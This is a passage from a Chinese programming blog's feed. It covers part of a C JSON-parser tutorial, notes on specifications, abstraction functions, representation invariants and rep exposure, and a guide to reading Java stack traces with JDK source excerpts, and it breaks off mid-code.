v)</span> </span>&#123;</span><br><span class="line">    EXPECT(c, <span class="string">&#x27;t&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span> (c-&gt;json[<span class="number">0</span>] != <span class="string">&#x27;r&#x27;</span> || c-&gt;json[<span class="number">1</span>] != <span class="string">&#x27;u&#x27;</span> || c-&gt;json[<span class="number">2</span>] != <span class="string">&#x27;e&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> LEPT_PARSE_INVALID_VALUE;</span><br><span class="line">    c-&gt;json += <span class="number">3</span>;</span><br><span class="line">    v-&gt;type = LEPT_TRUE;</span><br><span class="line">    <span class="keyword">return</span> LEPT_PARSE_OK;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">lept_parse_false</span><span class="params">(lept_context* c, lept_value* v)</span> </span>&#123;</span><br><span class="line">    EXPECT(c, <span class="string">&#x27;f&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span> (c-&gt;json[<span class="number">0</span>] != <span class="string">&#x27;a&#x27;</span> || c-&gt;json[<span class="number">1</span>] != <span class="string">&#x27;l&#x27;</span> || c-&gt;json[<span class="number">2</span>] != <span class="string">&#x27;s&#x27;</span> || c-&gt;json[<span class="number">3</span>] != <span class="string">&#x27;e&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> LEPT_PARSE_INVALID_VALUE;</span><br><span class="line">    c-&gt;json += <span class="number">4</span>;</span><br><span class="line">    v-&gt;type = LEPT_FALSE;</span><br><span class="line">    <span class="keyword">return</span> LEPT_PARSE_OK;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">lept_parse_value</span><span class="params">(lept_context* c, lept_value* v)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">switch</span> (*c-&gt;json) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;t&#x27;</span>:  <span class="keyword">return</span> lept_parse_true(c, v);</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;f&#x27;</span>:  <span class="keyword">return</span> lept_parse_false(c, v);</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;n&#x27;</span>:  <span class="keyword">return</span> lept_parse_null(c, v);</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;\0&#x27;</span>: <span class="keyword">return</span> LEPT_PARSE_EXPECT_VALUE;</span><br><span class="line">        <span class="keyword">default</span>:   <span class="keyword">return</span> LEPT_PARSE_INVALID_VALUE;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其实这 3 种类型都是解析字面量，可以使用单一个函数实现，例如用这种方式调用：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="string">&#x27;n&#x27;</span>: <span class="keyword">return</span> lept_parse_literal(c, v, <span class="string">&quot;null&quot;</span>, LEPT_NULL);</span><br></pre></td></tr></table></figure><p>这样可以减少一些重复代码，不过可能有少许额外性能开销。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;跟着github上的项目json-tutorial完成一个json解析器。本文对应该项目的第一单元。&lt;/p&gt;</summary>
    
    
    
    <category term="项目" scheme="https://www.fvolcano.red/categories/%E9%A1%B9%E7%9B%AE/"/>
    
    
    <category term="json" scheme="https://www.fvolcano.red/tags/json/"/>
    
  </entry>
  
  <entry>
    <title>软件构造spec：RI、AF与safety from rep exposure</title>
    <link href="https://www.fvolcano.red/2021/how-to-write-specification/"/>
    <id>https://www.fvolcano.red/2021/how-to-write-specification/</id>
    <published>2021-07-08T11:34:48.000Z</published>
    <updated>2021-07-08T11:34:48.000Z</updated>
    
    <content type="html"><![CDATA[<p>本文介绍了spec、AF、RI和safety from rep exposure的含义和写法。<a id="more"></a></p><p>参考资料：</p><ol><li><a href="https://www.pianshen.com/article/78341578333/">Spec、AF、RI以及Safety from rep exposure的一些体会 - 程序员大本营 (pianshen.com)</a></li><li><a href="https://blog.csdn.net/weixin_44513527/article/details/105102644">Safety from Rep Exposure</a></li><li><a href="https://blog.csdn.net/djd566/article/details/79749757">Java如何做到全面的Safety from rep exposure</a></li><li><a href="https://blog.csdn.net/qq_44013163/article/details/106600240">对于AF、RI、Safety from rep exposure的理解</a></li></ol><h1 id="Spec"><a href="#Spec" class="headerlink" title="Spec"></a>Spec</h1><p>Spec，既方法的设计规约（Specification）。</p><p>(1)为什么要设计规约？<br>1.没有规约，在团队合作时无法分配任务，无法写程序，即使写出来，也不知道对错<br>2.可以使程序与客户端之间达成一致，明确双方的责任，并且对正确实现进行定义。<br>3.规约给供需双方都确定了责任，在调用时，双方都要遵守</p><p>(2)规约的作用：<br>1.精确的规约，有助于区分责任<br>2.客户端无需阅读调用函数的代码，只需理解spec即可<br>3.规约可以隔离“变化”，无需通知客户端<br>4.规约也可以提高代码效率<br>规约相当于在调用者与实现者之间建立一道防火墙，调用者无需知道方法内部实现，了解规约进行调用即可。<br>也就是说，只要满足规约，实现者便可以对代码进行修改，如果两个方法内在实现不同，但是可以满足相同的规约，那么就可以称这两个方法具有行为等价性。</p><p>(3)行为等价性：<br>是站在客户端视角看行为等价性的。<br>可以根据规约判定是否行为等价，而与其具体实现无关。</p><p>(4)规约的结构：前置条件和后置条件<br>1.前置条件：对客户端的约束，在使用方法时必须满足的条件<br>2.后置条件：对开发者的约束，方法结束时必须满足的条件<br>3.契约：如果前置条件满足了，后置条件必须满足<br>注意：如果前置条件不满足，则方法可做任何事情。</p><p>(5)Java中的规约：<br>静态类型声明是一种规约，限制前置条件和后置条件，可据此进行静态类型检查static checking。<br>方法前的注释也是一种规约，但需人工判定其是否满足。<br>前置条件：@param<br>后置条件：@return 和@throws</p><h1 id="AF与RI"><a href="#AF与RI" class="headerlink" title="AF与RI"></a>AF与RI</h1><p>在我们了解AF与RI之前，我们需要了解一些基础知识。<br>在实现ADT时，我们会使用如下两个空间：<br>R：表示空间（rep values），即实现者看到和使用的空间<br>A：抽象空间（abstract values），即客户端看到和使用的空间<br>R到A：一定满射，不一定单射</p><h2 id="AF"><a href="#AF" class="headerlink" title="AF"></a>AF</h2><p>AF，既抽象函数（Abstraction function），R-&gt;A<br>AF描述内存到实际的映射，所以AF一定是满射，但不一定是单射，也就不一定是双射。</p><h2 id="RI"><a href="#RI" class="headerlink" title="RI"></a>RI</h2><p>RI，即表示不变量（Representation invariant），R → boolean<br>RI告诉我们空间R中的r是否被AF映射到了空间A中的某个值，如果把R中满足RI的元素形成一个子集，那么这个子集中所有元素均被AF映射到了空间A中<br>在上图中，RI可解释为“字符串中没有重复的字母”</p><p>AF和RI与内部表示的设计息息相关，不同的内部标识，需要设计不同的AF和RI；同一种表示可能有不同的RI，进而有不同的AF；即使同一种R，同样的RI，也可能有不同的AF，即“解释不同”</p><h1 id="Safety-from-rep-exposure"><a href="#Safety-from-rep-exposure" class="headerlink" title="Safety from rep exposure"></a>Safety from rep exposure</h1><p>首先我们要知道一个名词,表示泄露（representation exposure）：指类外的某个代码可以直接修改表示形式<br>而Safety from rep exposure，即表示泄漏的安全声明，就是对表示泄露安全相关的参数，特别是输入参数和返回值，给出保证不泄露内部表示的策略</p><p>1.All fields are private( final)——即将类中所有的属性（变量）定义为private类型，目的是不让用户得到你的内部属性</p><p>2.尽量使用immutable数据类型，比如能使用String就不使用StringBuilder，能使用Instance或LocalDateTime就不使用Data</p><p>3.如果我们使用了mutable类型的数据，为了防止对外泄露其内部表示，需要使用defensive copy，即防御式拷贝。如果是Set、Map等数据类型，还可以使用Collections.unmodifiableSet，Collections.unmodifiableMap等方法。</p><p>4.随时检查RI是否满足，自写checkRep（）方法（通常在其中使用assert来进行判断），在创造和改变表示的方法中（creators，producers，mutators），进行调用，来确保不变性。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;本文介绍了spec、AF、RI和safety from rep exposure的含义和写法。&lt;/p&gt;</summary>
    
    
    
    <category term="SoftwareConstruction" scheme="https://www.fvolcano.red/categories/SoftwareConstruction/"/>
    
    
  </entry>
  
  <entry>
    <title>异常栈信息stack trace应该怎么用</title>
    <link href="https://www.fvolcano.red/2021/how-to-read-and-use-stack-trace/"/>
    <id>https://www.fvolcano.red/2021/how-to-read-and-use-stack-trace/</id>
    <published>2021-07-07T13:51:48.000Z</published>
    <updated>2021-07-07T13:51:48.000Z</updated>
    
    <content type="html"><![CDATA[<p>本文详细总结了stack trace的各个部分的含义和使用方法，同时深入介绍了一些与异常相关的函数和最佳实践。<a id="more"></a></p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ol><li><a href="https://www.scalyr.com/blog/java-stack-trace-understanding/">What’s a Java Stack Trace?</a></li><li><a href="https://stackify.com/java-stack-trace/">Understanding and Leveraging the Java Stack Trace</a></li><li><a href="https://www.cnblogs.com/ismallboy/p/12779200.html">如何看异常堆栈信息</a></li><li><a href="https://www.twilio.com/blog/how-to-read-and-understand-a-java-stacktrace">Java Stack Trace: How to Read and Understand to Debug Code</a></li><li><a href="https://riptutorial.com/java/example/1815/creating-and-reading-stacktraces">Creating and reading stacktraces</a></li><li><a href="https://www.codejava.net/java-core/exception/understanding-exception-stack-trace-in-java-with-code-examples">Understanding Exception Stack Trace in Java with Code Examples</a></li></ol><h1 id="Call-Stack-函数调用栈-与-stack-trace"><a href="#Call-Stack-函数调用栈-与-stack-trace" class="headerlink" title="Call Stack 函数调用栈 与 stack trace"></a>Call Stack 函数调用栈 与 stack trace</h1><blockquote><p>The Stack, more accurately called the runtime or call stack, is a set of stack frames a program creates as it executes, organized in a stack data structure.</p></blockquote><p>函数调用栈是一个以栈的形式保存从程序开始到运行当时调用的所有函数栈的结构。</p><blockquote><p>Simply put, a stack trace is a representation of a call stack at a certain point in time, with each element representing a method invocation. The stack trace contains all invocations from the start of a thread until the point it’s generated. This is usually a position at which an exception takes place.</p></blockquote><p>Stack trace 则是call stack的一种展示形式，打印出函数的名字与相关代码行。</p><p>示例：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">StackTrace</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">    a();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">a</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    b();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">b</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    c();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">c</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    d();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">d</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    Thread.dumpStack();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">java.lang.Exception: Stack trace</span><br><span class="line">at java.base/java.lang.Thread.dumpStack(Thread.java:<span class="number">1383</span>)</span><br><span class="line">at com.ericgoebelbecker.stacktraces.StackTrace.d(StackTrace.java:<span class="number">23</span>)</span><br><span class="line">at com.ericgoebelbecker.stacktraces.StackTrace.c(StackTrace.java:<span class="number">19</span>)</span><br><span class="line">at com.ericgoebelbecker.stacktraces.StackTrace.b(StackTrace.java:<span class="number">15</span>)</span><br><span class="line">at com.ericgoebelbecker.stacktraces.StackTrace.a(StackTrace.java:<span class="number">11</span>)</span><br><span class="line">at com.ericgoebelbecker.stacktraces.StackTrace.main(StackTrace.java:<span class="number">7</span>)</span><br></pre></td></tr></table></figure><p>栈信息从上往下读，最上面的是最后调用的函数，main调用a，a调用b，b调用c，c调用d，d调用dumpStack，这个函数输出以上信息。</p><blockquote><p>A Java stack trace is a snapshot of a moment in time. You can see where your application was and how it got there. That’s valuable insight that you can use a few different ways.</p></blockquote><h1 id="Java-Exception"><a href="#Java-Exception" class="headerlink" title="Java Exception"></a>Java Exception</h1><blockquote><p>Stack traces and exceptions are often associated with each other. When you see a Java application throw an exception, you usually see a stack trace logged with it. This is because of how exceptions work.</p><p>When Java code throws an exception, the runtime looks up the stack for a method that has a handler that can process it. If it finds one, it passes the exception to it. If it doesn’t, the program exits. So exceptions and the call stack are linked directly. Understanding this relationship will help you figure out why your code threw an exception.</p></blockquote><p>Java Exception机制通常是和call stack函数调用栈联系在一起的。当某个函数抛出了一个异常，JVM会查看调用栈，看哪个函数可以处理这个异常（有catch），若找到则把异常传过去，若没有则终止程序。</p><p>捕捉到异常后可以执行不同的操作，一个简单的选择是直接输出这个异常的信息：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125; <span class="keyword">catch</span> (NullPointerException e) &#123;</span><br><span class="line">    System.err.println(e.getMessage());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>若没有能够处理这个异常的函数，异常会被JVM接管，JVM会输出它抛出地的函数调用栈信息：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Exception in thread <span class="string">&quot;main&quot;</span> java.lang.NullPointerException</span><br><span class="line">at com.ericgoebelbecker.stacktraces.StackTrace.d(StackTrace.java:<span class="number">29</span>)</span><br><span class="line">at com.ericgoebelbecker.stacktraces.StackTrace.c(StackTrace.java:<span class="number">24</span>)</span><br><span class="line">at com.ericgoebelbecker.stacktraces.StackTrace.b(StackTrace.java:<span class="number">20</span>)</span><br><span class="line">at com.ericgoebelbecker.stacktraces.StackTrace.a(StackTrace.java:<span class="number">16</span>)</span><br><span class="line">at com.ericgoebelbecker.stacktraces.StackTrace.main(StackTrace.java:<span class="number">9</span>)</span><br></pre></td></tr></table></figure><p>BUT 输出了这个信息不代表这个异常就一定没有被处理catch，<strong>一种情况</strong>是catch了以后又抛出了：</p><p><img src="/2021/how-to-read-and-use-stack-trace/image-20210709122348187.png" alt="image-20210709122348187"></p><p><strong>另一种情况</strong>是我们自己处理的时候输出了这个信息，只需要调用异常的printStackTrace()方法即可：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125; <span class="keyword">catch</span> (NullPointerException e) &#123;</span><br><span class="line">    e.printStackTrace();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2021/how-to-read-and-use-stack-trace/image-20210709122607629.png" alt="image-20210709122607629"></p><p>即使捕捉异常的操作是在main中执行的，它仍会打印出抛出地的调用栈信息，这有利于我们找到异常的源头。</p><p>这两种情况打印的内容有些不同：没有处理而终止的异常打印时开头多了一行内容：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Exception in thread <span class="string">&quot;main&quot;</span></span><br></pre></td></tr></table></figure><h1 id="stack-trace各部分具体介绍"><a href="#stack-trace各部分具体介绍" class="headerlink" title="stack trace各部分具体介绍"></a>stack trace各部分具体介绍</h1><p>原文：参考资料4</p><p>The first line tells us the details of the Exception:</p><p><img src="/2021/how-to-read-and-use-stack-trace/9oHmXuXT7nRpdSueZHD8I3sK2yLPdkPLBv6Kj8kjzfkELh.width-500.png" alt="Example java stack trace"></p><p>This is a good start. Line 2 shows what code was running when that happened:</p><p><img src="/2021/how-to-read-and-use-stack-trace/Hrwf15FHX0DEpuBEw73N5Xy_7icjNt1TLXRaNiu_D82aHY.width-500.png" alt="how to read stack trace"></p><p>That helps us narrow down the problem, but what part of the code called <code>badMethod</code>? The answer is on the next line down, which can be read in the exact same way. And how did we get there? Look on the next line. And so on, until you get to the last line, which is the <code>main</code> method of the application. Reading the stack trace from bottom to top you can trace the exact path from the beginning of your code, right to the Exception.</p><h2 id="将stack-trace记录在log中而不是打印在控制台"><a href="#将stack-trace记录在log中而不是打印在控制台" class="headerlink" title="将stack trace记录在log中而不是打印在控制台"></a>将stack trace记录在log中而不是打印在控制台</h2><p>使用Log4j或者Logback时，可以通过error函数保存异常的调用栈信息：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">logger.error(“Something bad happened:”, e);</span><br></pre></td></tr></table></figure><p>日志中的内容将会是：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Something bad happened:</span><br><span class="line">java.lang.NullPointerException: Oops!</span><br><span class="line">at com.ericgoebelbecker.stacktraces.StackTrace.d(StackTrace.java:<span class="number">28</span>)</span><br><span class="line">at com.ericgoebelbecker.stacktraces.StackTrace.c(StackTrace.java:<span class="number">24</span>)</span><br><span class="line">at com.ericgoebelbecker.stacktraces.StackTrace.b(StackTrace.java:<span class="number">20</span>)</span><br><span class="line">at com.ericgoebelbecker.stacktraces.StackTrace.a(StackTrace.java:<span class="number">16</span>)</span><br><span class="line">at com.ericgoebelbecker.stacktraces.StackTrace.main(StackTrace.java:<span class="number">9</span>)</span><br></pre></td></tr></table></figure><h1 id="深入stack-trace"><a href="#深入stack-trace" class="headerlink" title="深入stack trace"></a>深入stack trace</h1><h2 id="StackTraceElement-class"><a href="#StackTraceElement-class" class="headerlink" title="StackTraceElement class"></a>StackTraceElement class</h2><p>这个类的每一个实例代表了stack trace中的一个元素。</p><p>API：</p><ul><li><em>getClassName</em> – returns the fully qualified name of the class containing the method invocation</li><li><em>getMethodName</em> – returns the name of the method containing the method invocation</li><li><em>getFileName</em> – returns the name of the source file associated with the class containing the method invocation</li><li><em>getLineNumber</em> – returns the line number of the source line containing the execution point</li></ul><p>更多查看 <a href="https://docs.oracle.com/javase/10/docs/api/java/lang/StackTraceElement.html">Java API documentation</a></p><h2 id="Thread-class"><a href="#Thread-class" class="headerlink" title="Thread class"></a>Thread class</h2><p>我们还可以通过调用Thread实例的getStackTrace()方法从线程得到了其stack trace。这个方法返回一个包含StackTraceElement实例的数组。</p><p>示例：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> StackTraceElement[] methodA() &#123;</span><br><span class="line">    <span class="keyword">return</span> methodB();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> StackTraceElement[] methodB() &#123;</span><br><span class="line">    Thread thread = Thread.currentThread();</span><br><span class="line">    <span class="keyword">return</span> thread.getStackTrace();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">whenElementOneIsReadUsingThread_thenMethodUnderTestIsObtained</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    StackTraceElement[] stackTrace = <span class="keyword">new</span> StackElementExample().methodA();</span><br><span class="line">    StackTraceElement elementOne = stackTrace[<span class="number">1</span>];</span><br><span class="line">    assertEquals(<span class="string">&quot;com.stackify.stacktrace.StackElementExample&quot;</span>, elementOne.getClassName());</span><br><span class="line">    assertEquals(<span class="string">&quot;methodB&quot;</span>, elementOne.getMethodName());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>stackTrace[0]是getStackTrace这个方法本身的调用。</p><h2 id="Throwable-class"><a href="#Throwable-class" class="headerlink" title="Throwable class"></a>Throwable class</h2><p>除了可以对Exception e进行打印stack trace的操作（printStackTrace函数），我们还可以通过getStackTrace函数获得与Thread中相同的一个StackTraceElement数组：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> StackTraceElement[] methodC() &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        methodD();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Throwable t) &#123;</span><br><span class="line">        <span class="keyword">return</span> t.getStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">methodD</span><span class="params">()</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> Throwable(<span class="string">&quot;A test exception&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">whenElementZeroIsReadUsingThrowable_thenMethodThrowingThrowableIsObtained</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    StackTraceElement[] stackTrace = <span class="keyword">new</span> StackElementExample().methodC();</span><br><span class="line">    StackTraceElement elementZero = stackTrace[<span class="number">0</span>];</span><br><span class="line">    assertEquals(<span class="string">&quot;com.stackify.stacktrace.StackElementExample&quot;</span>, elementZero.getClassName());</span><br><span class="line">    assertEquals(<span class="string">&quot;methodD&quot;</span>, elementZero.getMethodName());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="打印异常堆栈信息的函数-printStackTrace"><a href="#打印异常堆栈信息的函数-printStackTrace" class="headerlink" title="打印异常堆栈信息的函数 printStackTrace"></a>打印异常堆栈信息的函数 printStackTrace</h2><p>printStackTrace：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">printStackTrace</span><span class="params">(PrintStreamOrWriter s)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// Guard against malicious overrides of Throwable.equals by</span></span><br><span class="line">    <span class="comment">// using a Set with identity equality semantics.</span></span><br><span class="line">    Set&lt;Throwable&gt; dejaVu =</span><br><span class="line">        Collections.newSetFromMap(<span class="keyword">new</span> IdentityHashMap&lt;Throwable, Boolean&gt;());</span><br><span class="line">    dejaVu.add(<span class="keyword">this</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">synchronized</span> (s.lock()) &#123;</span><br><span class="line">        <span class="comment">// Print our stack trace</span></span><br><span class="line">        s.println(<span class="keyword">this</span>);</span><br><span class="line">        StackTraceElement[] trace = getOurStackTrace();</span><br><span class="line">        <span class="keyword">for</span> (StackTraceElement traceElement : trace)</span><br><span class="line">            s.println(<span class="string">&quot;\tat &quot;</span> + traceElement);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Print suppressed exceptions, if any</span></span><br><span class="line">        <span class="keyword">for</span> (Throwable se : getSuppressed())</span><br><span class="line">            se.printEnclosedStackTrace(s, trace, SUPPRESSED_CAPTION, <span class="string">&quot;\t&quot;</span>, dejaVu);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Print cause, if any</span></span><br><span class="line">        Throwable ourCause = getCause();</span><br><span class="line">        <span class="keyword">if</span> (ourCause != <span class="keyword">null</span>)</span><br><span class="line">            ourCause.printEnclosedStackTrace(s, trace, CAUSE_CAPTION, <span class="string">&quot;&quot;</span>, dejaVu);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>printStackTrace内部调用printEnclosedStackTrace：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Print our stack trace as an enclosed exception for the specified</span></span><br><span class="line"><span class="comment">     * stack trace.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">printEnclosedStackTrace</span><span class="params">(PrintStreamOrWriter s,</span></span></span><br><span class="line"><span class="function"><span class="params">                                     StackTraceElement[] enclosingTrace,</span></span></span><br><span class="line"><span class="function"><span class="params">                                     String caption,</span></span></span><br><span class="line"><span class="function"><span class="params">                                     String prefix,</span></span></span><br><span class="line"><span class="function"><span class="params">                                     Set&lt;Throwable&gt; dejaVu)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">assert</span> Thread.holdsLock(s.lock());</span><br><span class="line">    <span class="keyword">if</span> (dejaVu.contains(<span class="keyword">this</span>)) &#123;</span><br><span class="line">        s.println(<span class="string">&quot;\t[CIRCULAR REFERENCE:&quot;</span> + <span class="keyword">this</span> + <span class="string">&quot;]&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        dejaVu.add(<span class="keyword">this</span>);</span><br><span class="line">        <span class="comment">// Compute number of frames in common between this and enclosing trace</span></span><br><span class="line">        StackTraceElement[] trace = getOurStackTrace();</span><br><span class="line">        <span class="keyword">int</span> m = trace.length - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">int</span> n = enclosingTrace.length - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span> (m &gt;= <span class="number">0</span> &amp;&amp; n &gt;=<span class="number">0</span> &amp;&amp; trace[m].equals(enclosingTrace[n])) &#123;</span><br><span class="line">            m--; n--;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> framesInCommon = trace.length - <span class="number">1</span> - m;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Print our stack trace</span></span><br><span class="line">        s.println(prefix + caption + <span class="keyword">this</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt;= m; i++)</span><br><span class="line">            s.println(prefix + <span class="string">&quot;\tat &quot;</span> + trace[i]);</span><br><span class="line">        <span class="keyword">if</span> (framesInCommon != <span class="number">0</span>)</span><br><span class="line">            s.println(prefix + <span class="string">&quot;\t... &quot;</span> + framesInCommon + <span 